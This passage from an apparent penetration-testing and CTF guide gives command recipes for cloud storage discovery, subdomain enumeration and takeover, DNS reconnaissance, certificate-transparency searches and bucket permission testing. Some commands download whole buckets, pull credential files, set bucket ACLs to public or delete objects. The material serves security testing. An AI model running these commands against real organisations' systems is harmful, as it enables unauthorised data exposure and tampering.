Azure storage account names must be globally unique, 3-24 characters, lowercase letters and numbers only.

**Naming patterns:**

- `companyname`
- `companynamestorage`
- `companynameprod`
- `companynamebackup`
- `companynamedata`

**Discovery methods:**

```bash
# Method 1: Direct enumeration via HTTP
curl -I https://targetaccount.blob.core.windows.net/

# Method 2: Container enumeration
curl -I https://targetaccount.blob.core.windows.net/container-name

# Common container names: backup, data, files, images, documents, logs, public, private, www

# Method 3: Using Azure CLI (requires authentication)
az storage account list
az storage container list --account-name targetaccount
az storage blob list --container-name containername --account-name targetaccount

# Method 4: Automated with cloud_enum
python3 cloud_enum.py -k company-name --azure
```

**Public container discovery:**

```bash
# Test for anonymous container listing
curl https://targetaccount.blob.core.windows.net/?comp=list

# Test for anonymous blob listing
curl https://targetaccount.blob.core.windows.net/container?restype=container&comp=list

# Download blob if public
curl https://targetaccount.blob.core.windows.net/container/file.txt
```

### GCP Cloud Storage Discovery

GCP bucket names must be globally unique, can contain letters, numbers, dashes, underscores, and dots.

**Discovery methods:**

```bash
# Method 1: Direct bucket access
gsutil ls gs://target-bucket
curl -I https://storage.googleapis.com/target-bucket/

# Method 2: HTTP endpoint enumeration
curl -I https://storage.googleapis.com/storage/v1/b/target-bucket

# Method 3: Using gcpbucketbrute
git clone https://github.com/RhinoSecurityLabs/GCPBucketBrute
cd GCPBucketBrute
python3 gcpbucketbrute.py -k company-name

# Method 4: Using cloud_enum
python3 cloud_enum.py -k company-name --gcp
```

**Bucket enumeration:**

```bash
# List bucket contents (if public)
gsutil ls gs://target-bucket/**

# Check bucket IAM policy
gsutil iam get gs://target-bucket

# Download bucket contents
gsutil -m cp -r gs://target-bucket ./local-folder
```

### Additional Cloud Asset Discovery

**Lambda functions / Cloud Functions:**

- Often exposed via API Gateway/Cloud Endpoints
- Function URLs may be predictable
- Check for exposed .zip deployment packages in S3/Storage

**RDS / Cloud SQL instances:**

```bash
# AWS RDS enumeration (requires credentials)
aws rds describe-db-instances
aws rds describe-db-snapshots --include-public

# Check for public snapshots
aws rds describe-db-snapshots --snapshot-type public

# Azure SQL enumeration
az sql server list
az sql db list --server servername --resource-group rgname

# GCP Cloud SQL
gcloud sql instances list
```

**Elastic IPs / Public IPs:**

```bash
# AWS Elastic IPs
aws ec2 describe-addresses

# Azure Public IPs
az network public-ip list

# GCP External IPs
gcloud compute addresses list
```

**Certificate transparency for asset discovery:** Cloud assets often have SSL certificates that appear in CT logs, revealing infrastructure.

```bash
# Using crt.sh
curl -s "https://crt.sh/?q=%.company.com&output=json" | jq -r '.[].name_value' | sort -u

# Using certspotter
curl -s "https://api.certspotter.com/v1/issuances?domain=company.com&include_subdomains=true&expand=dns_names" | jq -r '.[].dns_names[]' | sort -u
```

## Subdomain Enumeration

Subdomain enumeration reveals additional attack surface including cloud-hosted applications, staging environments, and forgotten infrastructure.

### Passive Subdomain Enumeration

**Certificate Transparency logs:**

```bash
# crt.sh query
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

# Using subfinder (aggregates multiple sources)
subfinder -d target.com -o subdomains.txt

# Subfinder with specific sources
subfinder -d target.com -sources certspotter,crtsh,hackertarget -o subdomains.txt
```

**DNS aggregators and search engines:**

```bash
# Using amass (passive mode)
amass enum -passive -d target.com -o amass-passive.txt

# Using assetfinder
assetfinder --subs-only target.com | tee assetfinder.txt

# Using findomain
findomain -t target.com -u findomain.txt

# Using chaos (ProjectDiscovery public dataset)
curl -s "https://chaos-data.projectdiscovery.io/index.json" | jq -r '.[] | select(.domain=="target.com") | .URL' | xargs curl -s | jq -r '.[]'
```

**Third-party APIs and services:**

```bash
# SecurityTrails API (requires API key)
curl -s "https://api.securitytrails.com/v1/domain/target.com/subdomains" \
  -H "APIKEY: your_api_key" | jq -r '.subdomains[]' | sed 's/$/.target.com/'

# VirusTotal API (requires API key)
curl -s "https://www.virustotal.com/api/v3/domains/target.com/subdomains" \
  -H "x-apikey: your_api_key" | jq -r '.data[].id'

# Shodan API (requires API key)
curl -s "https://api.shodan.io/dns/domain/target.com?key=YOUR_API_KEY" | jq -r '.subdomains[]' | sed 's/$/.target.com/'
```

**Web archives:**

```bash
# Using waybackurls
echo "target.com" | waybackurls | unfurl domains | sort -u

# Using gau (Get All URLs)
echo "target.com" | gau | unfurl domains | sort -u

# Direct Wayback Machine API
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=json&fl=original&collapse=urlkey" | jq -r '.[]' | unfurl domains | sort -u
```

### Active Subdomain Enumeration

**DNS brute-forcing:**

```bash
# Using puredns with massdns
puredns bruteforce wordlist.txt target.com -r resolvers.txt -w puredns-output.txt

# Using shuffledns
shuffledns -d target.com -w wordlist.txt -r resolvers.txt -o shuffledns-output.txt

# Using dnsgen for permutations
cat known-subdomains.txt | dnsgen - | shuffledns -d target.com -r resolvers.txt

# Using aiodnsbrute (async Python)
aiodnsbrute -w wordlist.txt -o aiodns-output.txt target.com
```

**Wordlists for subdomain brute-forcing:**

- SecLists: `/usr/share/seclists/Discovery/DNS/`
- `subdomains-top1million-5000.txt` (common starting point)
- `bitquark-subdomains-top100000.txt` (comprehensive)
- `dns-Jhaddix.txt` (curated by Jason Haddix)

**Recommended resolver lists:**

```bash
# Download public resolver list
curl -s https://public-dns.info/nameservers.txt > resolvers.txt

# Filter for reliable resolvers
dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 100 -o resolvers-valid.txt
```

### Subdomain Takeover Detection

Cloud services often allow custom domains. If DNS points to deprovisioned cloud resources, subdomain takeover may be possible.

**Vulnerable patterns:**

- CNAME pointing to non-existent AWS S3 buckets
- CNAME pointing to unclaimed Azure websites
- CNAME pointing to deleted Heroku apps
- CNAME pointing to removed GitHub Pages
- CNAME pointing to deprovisioned CloudFront distributions

**Detection tools:**

```bash
# Using subjack
subjack -w subdomains.txt -t 100 -timeout 30 -o subjack-output.txt -ssl

# Using subzy
subzy run --targets subdomains.txt --concurrency 100

# Using nuclei with takeover templates
nuclei -l subdomains.txt -t ~/nuclei-templates/takeovers/ -o nuclei-takeovers.txt

# Manual verification
dig subdomain.target.com
# Check CNAME record, then verify if target service exists
```

**Common vulnerable CNAME patterns:**

```bash
# AWS S3
*.s3.amazonaws.com
*.s3-website-*.amazonaws.com

# Azure
*.azurewebsites.net
*.cloudapp.net
*.blob.core.windows.net

# Heroku
*.herokuapp.com

# GitHub Pages
*.github.io

# CloudFront
*.cloudfront.net
```

**Takeover verification:**

```bash
# S3 bucket takeover test
aws s3 mb s3://subdomain-from-cname
aws s3 website s3://subdomain-from-cname --index-document index.html
echo "Takeover POC" > index.html
aws s3 cp index.html s3://subdomain-from-cname/

# Azure website takeover test (requires azure CLI)
az webapp create --resource-group rg-name --plan plan-name --name subdomain-from-cname

# GitHub Pages takeover
# Create repository named subdomain-from-cname.github.io
# Add CNAME file with target subdomain
```

### Cloud-Specific Subdomain Patterns

**AWS patterns:**

- `s3.target.com` or `s3-backup.target.com`
- `cloudfront.target.com`
- `api-gateway.target.com`
- `elb-*.target.com` or `lb-*.target.com`
- `*.execute-api.*.amazonaws.com` (API Gateway)

**Azure patterns:**

- `*.azurewebsites.net`
- `*.scm.azurewebsites.net` (Kudu console)
- `*.blob.core.windows.net`
- `*.database.windows.net`
- `*.azurefd.net` (Front Door)

**GCP patterns:**

- `*.appspot.com` (App Engine)
- `*.cloudfunctions.net`
- `*.run.app` (Cloud Run)
- `*.web.app` / `*.firebaseapp.com` (Firebase)

## DNS Reconnaissance

DNS reconnaissance extracts comprehensive information about target infrastructure through various DNS record types and techniques.

### DNS Record Enumeration

**Basic record queries:**

```bash
# A records (IPv4 addresses)
dig target.com A +short
host target.com

# AAAA records (IPv6 addresses)
dig target.com AAAA +short

# MX records (mail servers)
dig target.com MX +short

# NS records (nameservers)
dig target.com NS +short

# TXT records (SPF, DKIM, verification records, cloud provider tags)
dig target.com TXT +short

# CNAME records
dig subdomain.target.com CNAME +short

# SOA record (Start of Authority)
dig target.com SOA +short

# ANY query (not always supported)
dig target.com ANY
```

**Comprehensive DNS enumeration:**

```bash
# Using dnsenum
dnsenum target.com

# Using fierce
fierce --domain target.com

# Using dnsrecon
dnsrecon -d target.com -t std
dnsrecon -d target.com -t axfr  # Zone transfer attempt
dnsrecon -d target.com -t brt -D /usr/share/wordlists/dnsmap.txt  # Brute force

# Using nmap NSE scripts
nmap --script dns-brute target.com
nmap --script dns-zone-transfer target.com
```

### DNS Zone Transfer

Zone transfers (AXFR) are rarely successful in modern infrastructure but worth testing. Cloud DNS services typically disable zone transfers by default.

```bash
# Identify nameservers
NS_SERVERS=$(dig target.com NS +short)

# Attempt zone transfer on each nameserver
for ns in $NS_SERVERS; do
    echo "Attempting zone transfer on $ns"
    dig @$ns target.com AXFR
done

# Using host command
host -t axfr target.com ns1.target.com

# Using dnsrecon
dnsrecon -d target.com -t axfr
```

### Reverse DNS Lookup

Reverse DNS reveals additional domains/subdomains hosted on known IP addresses.

```bash
# Single IP reverse lookup
dig -x 192.0.2.1 +short
host 192.0.2.1

# Batch reverse DNS on IP range
for ip in 192.0.2.{1..254}; do
    host $ip | grep "domain name pointer"
done

# Using prips for CIDR range
prips 192.0.2.0/24 | xargs -I{} -P50 host {} | grep "domain name pointer"

# Using masscan with reverse DNS
masscan 192.0.2.0/24 -p80,443 --rate 10000 --open | awk '{print $6}' | xargs -I{} host {}
```

### DNS Cache Snooping

[Inference] DNS cache snooping may reveal recently queried domains, potentially exposing internal infrastructure. However, modern DNS servers typically disable or restrict cache queries.

```bash
# Query DNS server cache (may not work on hardened servers)
dig @8.8.8.8 target.com +norecurse

# Check if specific record exists in cache
for domain in $(cat interesting-domains.txt); do
    dig @target-dns-server $domain +norecurse +short | grep -v '^$' && echo "$domain is cached"
done
```

### Cloud Provider DNS Services

**AWS Route 53:**

```bash
# Enumerate hosted zones (requires credentials)
aws route53 list-hosted-zones

# Get records from zone
aws route53 list-resource-record-sets --hosted-zone-id Z1234567890ABC

# Identify Route 53 nameservers (pattern: ns-*.awsdns-*.com/org/net/co.uk)
dig target.com NS | grep awsdns
```

**Azure DNS:**

```bash
# List DNS zones (requires credentials)
az network dns zone list

# List records in zone
az network dns record-set list --zone-name target.com --resource-group rg-name

# Identify Azure DNS (nameservers end in .azure-dns.*)
dig target.com NS | grep azure-dns
```

**Google Cloud DNS:**

```bash
# List managed zones (requires credentials)
gcloud dns managed-zones list

# List records
gcloud dns record-sets list --zone=zone-name

# Identify Cloud DNS (nameservers end in .googledomains.com)
dig target.com NS | grep googledomains
```

### DNS Exfiltration Channels

[Inference] Organizations may use DNS for data exfiltration or C2 communication. Long TXT records or excessive queries to specific domains may indicate this.

```bash
# Monitor DNS queries for suspicious patterns
tcpdump -i eth0 -n port 53 -A

# Analyze DNS query lengths
tshark -i eth0 -f "port 53" -T fields -e dns.qry.name | awk '{print length, $0}' | sort -rn

# Look for base64-like patterns in subdomain queries
tcpdump -i eth0 -n port 53 | grep -E '[A-Za-z0-9+/]{20,}'
```

### DNSSEC Validation

DNSSEC provides authentication for DNS responses. Cloud providers offer DNSSEC support.

```bash
# Check if DNSSEC is enabled
dig target.com +dnssec

# Validate DNSSEC chain
delv target.com

# Check DNSKEY records
dig target.com DNSKEY +short

# Check DS records
dig target.com DS +short
```

### DNS Reconnaissance Automation

**Comprehensive DNS reconnaissance workflow:**

```bash
#!/bin/bash
DOMAIN=$1

echo "[+] Starting DNS reconnaissance for $DOMAIN"

# Basic records
echo "[*] Enumerating basic records..."
dig $DOMAIN A AAAA MX NS TXT CNAME SOA +short > dns-records.txt

# Subdomain enumeration
echo "[*] Passive subdomain enumeration..."
subfinder -d $DOMAIN -silent -o passive-subs.txt
amass enum -passive -d $DOMAIN -o amass-passive.txt
cat passive-subs.txt amass-passive.txt | sort -u > all-subdomains.txt

# Active brute-force
echo "[*] Active subdomain brute-forcing..."
puredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt $DOMAIN -r resolvers.txt -w brute-subs.txt

# Combine and resolve
cat all-subdomains.txt brute-subs.txt | sort -u > final-subdomains.txt
puredns resolve final-subdomains.txt -r resolvers.txt -w resolved-subdomains.txt

# Check for subdomain takeovers
echo "[*] Checking for subdomain takeovers..."
subjack -w resolved-subdomains.txt -t 100 -timeout 30 -o subjack-results.txt -ssl

# Extract IPs for reverse DNS
echo "[*] Extracting IP addresses..."
cat resolved-subdomains.txt | xargs -I{} dig {} +short | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u > ips.txt

# Reverse DNS on discovered IPs
echo "[*] Performing reverse DNS..."
cat ips.txt | xargs -I{} -P50 host {} | grep "domain name pointer" > reverse-dns.txt

echo "[+] DNS reconnaissance complete!"
```

### Cloud-Specific DNS Indicators

**Identify cloud provider from DNS:**

```bash
# Check for cloud provider indicators in DNS records
dig target.com A +short | xargs -I{} whois {} | grep -i "amazon\|microsoft\|google\|azure\|aws\|gcp"

# AWS indicators
dig target.com NS | grep -i awsdns
dig target.com MX | grep -i amazonses  # SES mail

# Azure indicators
dig target.com NS | grep -i azure-dns
dig target.com A | grep -i "cloudapp\|azurewebsites"

# GCP indicators
dig target.com NS | grep -i googledomains
dig target.com A | grep -i "appspot\|run.app"

# CloudFlare (common CDN/DNS provider)
dig target.com NS | grep -i cloudflare
```

### DNS Monitoring and Change Detection

[Inference] Monitoring DNS changes over time may reveal infrastructure modifications, new services, or security incidents.

```bash
# Continuous DNS monitoring script
#!/bin/bash
DOMAIN=$1
while true; do
    dig $DOMAIN ANY > dns-snapshot-$(date +%Y%m%d-%H%M%S).txt
    sleep 3600  # Check every hour
done

# Compare DNS snapshots
diff dns-snapshot-old.txt dns-snapshot-new.txt
```

---

**Related critical topics:** S3 Bucket Exploitation, Subdomain Takeover Exploitation, Cloud Metadata Service Attacks (SSRF), Cloud API Enumeration

---

## Certificate Transparency Logs

Certificate Transparency (CT) logs are cryptographically assured, publicly auditable records of SSL/TLS certificates. These logs are invaluable for reconnaissance as organizations cannot hide certificate issuance, revealing subdomains, internal hosts, and infrastructure otherwise not publicly advertised.

### Core Concepts

CT logs exist because Certificate Authorities must submit certificates to public logs. This creates an immutable record that defenders cannot redact, making CT logs particularly valuable for discovering:

- Subdomains (including internal/staging/dev environments)
- Historical infrastructure
- Certificate issuance patterns
- Organizational naming conventions
- Cloud service usage

### Tools and Techniques

**crt.sh (Web Interface & API)**

Primary web interface: https://crt.sh

Command-line queries using curl:

```bash
# Basic domain search
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u

# Filter by specific certificate patterns
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].common_name' | sort -u

# Search with wildcard for all subdomains
curl -s "https://crt.sh/?q=%.%.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

# Export to file with timestamp filtering
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[] | select(.entry_timestamp >= "2024-01-01") | .name_value' | sort -u > ct_results.txt
```

**ctfr (CT logs Finder)**

```bash
# Installation
git clone https://github.com/UnaPibaGeek/ctfr.git
cd ctfr
pip3 install -r requirements.txt

# Basic usage
python3 ctfr.py -d target.com

# Output to file
python3 ctfr.py -d target.com -o results.txt

# Combine with other tools
python3 ctfr.py -d target.com | tee domains.txt | httpx -silent
```

**Amass (Comprehensive OSINT)**

```bash
# CT log enumeration specifically
amass enum -d target.com -src

# Focus on CT logs with passive mode
amass enum -passive -d target.com -src -o amass_output.txt

# Filter results to show only CT log sources
amass enum -d target.com -src | grep -i "cert"
```

**Subfinder with CT logs**

```bash
# Installation
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# Run with all sources including CT logs
subfinder -d target.com -all -silent

# CT-specific sources only [Inference - based on source configuration]
subfinder -d target.com -sources censys,certspotter,crtsh -silent

# Recursive subdomain discovery
subfinder -d target.com -all -recursive -silent -o subdomains.txt
```

**Certificate Search (certspotter)**

```bash
# Using SSLMate's certspotter API
curl -s https://api.certspotter.com/v1/issuances?domain=target.com&expand=dns_names | jq -r '.[].dns_names[]' | sort -u

# With API key for higher limits
curl -s "https://api.certspotter.com/v1/issuances?domain=target.com&expand=dns_names" -H "Authorization: Bearer YOUR_API_KEY" | jq -r '.[].dns_names[]' | sort -u
```

### Advanced Techniques

**Discovering Naming Patterns**

```bash
# Extract patterns from discovered domains
cat ct_domains.txt | awk -F'.' '{print $(NF-2)"."$(NF-1)"."$NF}' | sort | uniq -c | sort -rn

# Find environment indicators
grep -E '(dev|stage|staging|test|qa|uat|prod|internal)' ct_domains.txt

# Identify cloud services
grep -E '(aws|azure|gcp|cloudfront|s3|blob)' ct_domains.txt
```

**Temporal Analysis**

```bash
# Query specific time ranges via crt.sh API
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[] | select(.entry_timestamp >= "2024-10-01" and .entry_timestamp <= "2024-10-23") | .name_value' | sort -u

# Identify recently issued certificates (potential new infrastructure)
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[] | "\(.entry_timestamp) \(.name_value)"' | sort -rn | head -20
```

**Wildcard Certificate Analysis**

```bash
# Extract wildcard certificates (may indicate broad infrastructure)
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[] | select(.name_value | startswith("*.")) | .name_value' | sort -u

# Validate discovered wildcards
cat wildcards.txt | sed 's/\*\.//' | httpx -silent -title -tech-detect
```

### Validation and Enrichment

After CT log enumeration, validate and enrich findings:

```bash
# Quick live host detection
cat domains.txt | httpx -silent -status-code -title -tech-detect -o live_hosts.txt

# DNS resolution validation
cat domains.txt | dnsx -silent -a -resp -o resolved_domains.txt

# Screenshot for visual confirmation
cat live_hosts.txt | aquatone -out screenshots/

# Port scanning discovered hosts
cat resolved_domains.txt | awk '{print $2}' | nmap -iL - -p- --open -oA nmap_ct_hosts
```

### CTF Application Notes

[Inference] In CTF contexts, CT logs often reveal:

- Admin/staging portals with weaker authentication
- API endpoints with different security postures
- Forgotten or misconfigured legacy systems
- Development environments with debug features enabled
- Alternative entry points to target infrastructure

---

## Bucket/Blob Enumeration

Cloud storage buckets (AWS S3, Azure Blob Storage, Google Cloud Storage) are frequently misconfigured, exposing sensitive data or providing attack vectors. Bucket enumeration involves discovering storage containers through predictable naming patterns, leaked references, or brute-force techniques.

### Storage Service Identification

**AWS S3 Bucket Formats:**

- `https://bucket-name.s3.amazonaws.com`
- `https://s3.amazonaws.com/bucket-name`
- `https://bucket-name.s3-region.amazonaws.com`
- `s3://bucket-name`

**Azure Blob Storage Formats:**

- `https://accountname.blob.core.windows.net/container`
- `https://accountname.blob.core.windows.net/container/blob`

**Google Cloud Storage Formats:**

- `https://storage.googleapis.com/bucket-name`
- `https://bucket-name.storage.googleapis.com`
- `gs://bucket-name`

### Tools and Techniques

**AWS S3 - awscli**

```bash
# Installation
apt install awscli -y

# Anonymous bucket listing (if public)
aws s3 ls s3://bucket-name --no-sign-request

# Recursive listing
aws s3 ls s3://bucket-name --recursive --no-sign-request

# Download entire bucket (if accessible)
aws s3 sync s3://bucket-name ./local-folder --no-sign-request

# Test specific file access
aws s3 cp s3://bucket-name/file.txt . --no-sign-request

# Check bucket region
aws s3api get-bucket-location --bucket bucket-name --no-sign-request
```

**S3Scanner**

```bash
# Installation
git clone https://github.com/sa7mon/S3Scanner.git
cd S3Scanner
pip3 install -r requirements.txt

# Scan list of buckets
python3 s3scanner.py --list bucket_names.txt

# Check specific bucket
python3 s3scanner.py --bucket target-bucket-name

# Dump accessible buckets
python3 s3scanner.py --list bucket_names.txt --dump
```

**Bucket Stream (Real-time monitoring)**

```bash
# Installation
git clone https://github.com/eth0izzle/bucket-stream.git
cd bucket-stream
pip install -r requirements.txt

# Monitor CT logs for bucket references
python3 bucket-stream.py --config config.yml

# Custom keyword monitoring
python3 bucket-stream.py --config config.yml --keywords "target,company,prod"
```

**CloudBrute**

```bash
# Installation
git clone https://github.com/0xsha/CloudBrute.git
cd CloudBrute
go build

# AWS S3 enumeration
./cloudbrute -d target.com -k target -k company -k prod -w -p aws

# Azure enumeration
./cloudbrute -d target.com -k target -k company -p azure

# GCP enumeration
./cloudbrute -d target.com -k target -k company -p gcp
```

**cloud_enum**

```bash
# Installation
git clone https://github.com/initstring/cloud_enum.git
cd cloud_enum
pip3 install -r requirements.txt

# Multi-cloud enumeration
python3 cloud_enum.py -k target -k company

# Keyword file input
python3 cloud_enum.py -kf keywords.txt

# Specify cloud provider
python3 cloud_enum.py -k target --aws --azure --gcp
```

**Lazys3**

```bash
# Installation
git clone https://github.com/nahamsec/lazys3.git
cd lazys3
ruby lazys3.rb

# Basic usage
ruby lazys3.rb company

# With wordlist
ruby lazys3.rb company wordlist.txt
```

### Manual Enumeration Techniques

**Common Naming Patterns:**

```bash
# Generate potential bucket names
for prefix in www dev staging backup assets downloads uploads images; do
    echo "target-${prefix}"
    echo "${prefix}-target"
    echo "target.${prefix}"
    echo "target${prefix}"
done > bucket_candidates.txt

# Add common suffixes
for suffix in prod dev test stage backup static media; do
    echo "target-${suffix}"
done >> bucket_candidates.txt

# Date-based patterns (backups)
for year in {2020..2024}; do
    echo "target-backup-${year}"
    echo "target-${year}"
done >> bucket_candidates.txt
```

**Testing Bucket Access:**

```bash
# Test read access (AWS)
curl -I https://bucket-name.s3.amazonaws.com/

# Test file listing
curl https://bucket-name.s3.amazonaws.com/

# Test write access (attempt upload) [Caution: Only in authorized testing]
aws s3 cp test.txt s3://bucket-name/test.txt --no-sign-request

# Test authenticated vs anonymous
aws s3 ls s3://bucket-name  # With credentials
aws s3 ls s3://bucket-name --no-sign-request  # Without credentials
```

**Azure Blob Enumeration:**

```bash
# Test container listing
curl -I https://accountname.blob.core.windows.net/container

# List blobs in container
curl "https://accountname.blob.core.windows.net/container?restype=container&comp=list"

# Enumerate account containers [Inference - requires valid account name]
for container in public private backup assets; do
    curl -I "https://accountname.blob.core.windows.net/${container}"
done

# Using azure-cli
az storage blob list --account-name accountname --container-name container --output table
```

**GCP Storage Enumeration:**

```bash
# Test bucket listing
curl https://storage.googleapis.com/bucket-name/

# List bucket contents (XML format)
curl https://storage.googleapis.com/bucket-name

# Using gsutil
gsutil ls gs://bucket-name/
gsutil ls -r gs://bucket-name/**

# Test anonymous access
gsutil -m cp gs://bucket-name/file.txt .
```

### Discovery Through Source Analysis

```bash
# Search JavaScript files for bucket references
curl -s https://target.com | grep -oP '([a-z0-9.-]+\.s3\.amazonaws\.com|[a-z0-9.-]+\.blob\.core\.windows\.net|storage\.googleapis\.com/[a-z0-9.-]+)'

# Extract from page source
wget -qO- https://target.com | grep -Eo 's3://[a-zA-Z0-9.-]+|gs://[a-zA-Z0-9.-]+'

# Search through GitHub
# (Manual) Use GitHub search: "target.com" AND (s3 OR blob OR storage.googleapis)

# Wayback Machine analysis
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=json&collapse=urlkey" | jq -r '.[] | .[2]' | grep -E '(s3|blob|storage)'
```

### Permission Testing

Once a bucket is discovered, test permissions systematically:

```bash
# AWS S3 Permission Matrix Test
# READ
aws s3 ls s3://bucket-name --no-sign-request

# READ_ACP (Access Control Policy)
aws s3api get-bucket-acl --bucket bucket-name --no-sign-request

# WRITE [Caution: Authorized testing only]
echo "test" > test.txt
aws s3 cp test.txt s3://bucket-name/test.txt --no-sign-request

# WRITE_ACP [Caution: Critical - can escalate to full control]
aws s3api put-bucket-acl --bucket bucket-name --acl public-read --no-sign-request

# FULL_CONTROL
aws s3api delete-object --bucket bucket-name --key test.txt --no-sign-request
```

### Automated Multi-Tool Approach

```bash
#!/bin/bash
# Comprehensive bucket enumeration workflow

TARGET="target"
KEYWORDS="target company prod backup"

# Generate candidate names
echo "[+] Generating candidates..."
for k in $KEYWORDS; do
    for prefix in "" "www-" "dev-" "staging-" "prod-" "backup-"; do
        for suffix in "" "-backup" "-static" "-assets" "-prod" "-dev"; do
            echo "${prefix}${k}${suffix}"
        done
    done
done > candidates.txt

# AWS S3 enumeration
echo "[+] Scanning AWS S3..."
s3scanner scan --buckets candidates.txt > s3_results.txt

# Azure enumeration
echo "[+] Scanning Azure..."
# [Note: Requires valid account names - obtain from DNS/subdomain enumeration]

# GCP enumeration
echo "[+] Scanning GCP..."
while read bucket; do
    curl -Is "https://storage.googleapis.com/${bucket}/" | head -1
done < candidates.txt > gcp_results.txt

# Validate accessible buckets
echo "[+] Validating accessible buckets..."
grep -i "200\|403" s3_results.txt gcp_results.txt
```

### CTF-Specific Considerations

[Inference] In CTF scenarios, bucket enumeration often yields:

- Flags stored in predictable file paths (`flag.txt`, `secret.txt`)
- Configuration files with credentials (`config.json`, `.env`)
- Backup archives with source code or databases
- Publicly writable buckets allowing file upload for XSS/XXE
- Bucket policies that can be modified for privilege escalation

**Common CTF Patterns:**

```bash
# Check for obvious files
for file in flag.txt secret.txt config.json .env credentials.txt backup.zip; do
    aws s3 cp s3://bucket-name/${file} . --no-sign-request 2>/dev/null && echo "[+] Found: ${file}"
done

# Recursive search for flags
aws s3 ls s3://bucket-name --recursive --no-sign-request | grep -E '(flag|secret|key|password|credential)'
```

---

## Cloud IP Range Identification

Identifying IP ranges owned by cloud providers allows threat hunters to distinguish cloud-hosted infrastructure, understand attack surface scope, and perform targeted reconnaissance. Cloud providers publish their IP ranges, which can be programmatically queried and analyzed.

### AWS IP Ranges

AWS publishes current IP ranges in JSON format at: https://ip-ranges.amazonaws.com/ip-ranges.json

**Downloading and Parsing AWS Ranges:**

```bash
# Download current AWS IP ranges
curl -s https://ip-ranges.amazonaws.com/ip-ranges.json -o aws-ip-ranges.json

# Extract all IPv4 ranges
jq -r '.prefixes[] | .ip_prefix' aws-ip-ranges.json > aws-ipv4.txt

# Filter by region
jq -r '.prefixes[] | select(.region=="us-east-1") | .ip_prefix' aws-ip-ranges.json

# Filter by service (EC2, S3, CloudFront, etc.)
jq -r '.prefixes[] | select(.service=="EC2") | .ip_prefix' aws-ip-ranges.json
jq -r '.prefixes[] | select(.service=="S3") | .ip_prefix' aws-ip-ranges.json
jq -r '.prefixes[] | select(.service=="CLOUDFRONT") | .ip_prefix' aws-ip-ranges.json

# Combine filters (EC2 in specific region)
jq -r '.prefixes[] | select(.service=="EC2" and .region=="us-west-2") | .ip_prefix' aws-ip-ranges.json

# IPv6 ranges
jq -r '.ipv6_prefixes[] | .ipv6_prefix' aws-ip-ranges.json

# Get all regions
jq -r '.prefixes[].region' aws-ip-ranges.json | sort -u

# Get all services
jq -r '.prefixes[].service' aws-ip-ranges.json | sort -u
```

**Identifying Target in AWS Ranges:**

```bash
# Check if IP belongs to AWS
TARGET_IP="54.239.28.176"
jq --arg ip "$TARGET_IP" '.prefixes[] | select(.ip_prefix | contains($ip))' aws-ip-ranges.json

# Using grepcidr for efficient CIDR matching
cat aws-ipv4.txt | grepcidr -f - <(echo $TARGET_IP)

# Bulk check multiple IPs
cat target_ips.txt | grepcidr -f aws-ipv4.txt
```

### Azure IP Ranges

Azure publishes IP ranges through downloadable JSON files (updated weekly). Links are available at: https://www.microsoft.com/en-us/download/details.aspx?id=56519

**Downloading and Parsing Azure Ranges:**

```bash
# Download Azure IP ranges (Public Cloud)
# [Note: URL changes weekly - obtain current link from Microsoft download page]
curl -s -L "https://download.microsoft.com/download/..." -o azure-ip-ranges.json

# Extract all IP ranges
jq -r '.values[].properties.addressPrefixes[]' azure-ip-ranges.json > azure-ips.txt

# Filter by region
jq -r '.values[] | select(.properties.region=="eastus") | .properties.addressPrefixes[]' azure-ip-ranges.json

# Filter by service tag
jq -r '.values[] | select(.name | contains("AzureCloud")) | .properties.addressPrefixes[]' azure-ip-ranges.json

# Specific service (e.g., Storage)
jq -r '.values[] | select(.name | contains("Storage")) | .properties.addressPrefixes[]' azure-ip-ranges.json
```

### Google Cloud IP Ranges

GCP publishes IP ranges through DNS queries and JSON endpoints.

**Querying GCP Ranges:**

```bash
# Cloud ranges via DNS (SPF record)
dig txt _cloud-netblocks.googleusercontent.com +short

# Parse SPF includes
dig txt _cloud-netblocks.googleusercontent.com +short | grep -oP 'include:_cloud-netblocks\d+\.googleusercontent\.com' | sed 's/include://' | xargs -I {} dig txt {} +short

# Automated recursive extraction
for i in {1..5}; do
    dig txt _cloud-netblocks${i}.googleusercontent.com +short | grep -oP 'ip4:[0-9./]+' | cut -d: -f2
done > gcp-ips.txt

# Google services (via SPF)
dig txt _spf.google.com +short | grep -oP 'ip4:[0-9./]+'

# GCP JSON endpoint (global)
curl -s https://www.gstatic.com/ipranges/cloud.json | jq -r '.prefixes[] | .ipv4Prefix // .ipv6Prefix'

# Filter by region (via services.json)
curl -s https://www.gstatic.com/ipranges/cloud.json | jq -r '.prefixes[] | select(.scope=="us-east1") | .ipv4Prefix'
```

### Oracle Cloud IP Ranges

Oracle provides IP ranges in JSON format: https://docs.oracle.com/en-us/iaas/tools/public_ip_ranges.json

```bash
# Download Oracle Cloud ranges
curl -s https://docs.oracle.com/en-us/iaas/tools/public_ip_ranges.json -o oracle-ip-ranges.json

# Extract all ranges
jq -r '.regions[].cidrs[].cidr' oracle-ip-ranges.json > oracle-ips.txt

# Filter by region
jq -r '.regions[] | select(.region=="us-phoenix-1") | .cidrs[].cidr' oracle-ip-ranges.json
```

### DigitalOcean IP Ranges

DigitalOcean publishes ranges via CSV: https://www.digitalocean.com/geo/google.csv

```bash
# Download and parse DigitalOcean ranges
curl -s https://www.digitalocean.com/geo/google.csv | tail -n +2 | cut -d, -f1 > digitalocean-ips.txt
```

### Cloudflare IP Ranges

Cloudflare publishes IPv4 and IPv6 ranges at:

- https://www.cloudflare.com/ips-v4
- https://www.cloudflare.com/ips-v6

```bash
# Download Cloudflare ranges
